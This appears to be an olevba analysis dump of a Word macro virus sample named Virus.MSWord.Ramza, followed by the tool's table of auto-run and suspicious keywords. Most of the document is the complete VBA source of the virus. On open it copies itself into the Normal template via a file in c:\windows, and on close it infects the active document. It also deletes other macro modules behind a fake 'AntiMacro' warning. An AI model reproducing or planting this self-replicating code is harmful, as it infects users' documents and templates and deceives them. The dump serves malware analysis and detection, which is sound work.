olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ramza
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ramza - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Const Azmar = "The Azmar"
Dim Normal, Active As Object
Dim Code, Macro, Nome As String
Dim Lines As Integer
Dim Contaminado As Boolean
Private Sub Document_Open()
On Error Resume Next
Set Normal = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
Set Active = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule

If Not Active.Find(Azmar, 1, 1, 100, 100) Then
 Macro = Normal.Lines(1, Normal.CountOfLines)
 Lines = Normal.CountOfLines
Else
 Macro = Active.Lines(1, Active.CountOfLines)
 Lines = Active.CountOfLines
End If

Open "c:\windows\scandisk.log" For Output As #1
Print #1, Macro
Close #1

If Not Normal.Find(Azmar, 1, 1, 100, 100) Then
 Normal.DeleteLines 1, Lines
 Normal.AddFromFile ("c:\windows\scandisk.log")
 NormalTemplate.Save
End If

End Sub
Private Sub Document_Close()
On Error Resume Next
Set Active = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
Lines = Active.CountOfLines
If Not Active.Find(Azmar, 1, 1, 100, 100) Then
 Active.DeleteLines 1, Lines
 Active.AddFromFile ("c:\windows\scandisk.log")
 ActiveDocument.Save
End If

Contaminado = False
For Code = NormalTemplate.VBProject.VBComponents.Count To 2 Step -1
 Nome = NormalTemplate.VBProject.VBComponents(Code).Name
 MsgBox "Possível vírus! " & Nome & " pronto para remoção!", , "AntiMacro - By Pacheco"
 NormalTemplate.VBProject.VBComponents.Remove NormalTemplate.VBProject.VBComponents(Code)
Next

If Contaminado Then
 NormalTemplate.Save
End If

Contaminado = False
For Code = ActiveDocument.VBProject.VBComponents.Count To 2 Step -1
 Nome = ActiveDocument.VBProject.VBComponents(Code).Name
 MsgBox "Possível vírus! " & Nome & " pronto para remoção!", , "AntiMacro - By Pacheco"
 ActiveDocument.VBProject.VBComponents.Remove ActiveDocument.VBProject.VBComponents(Code)
 Contaminado = True
Next

If Contaminado Then
 ActiveDocument.Save
End If

End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

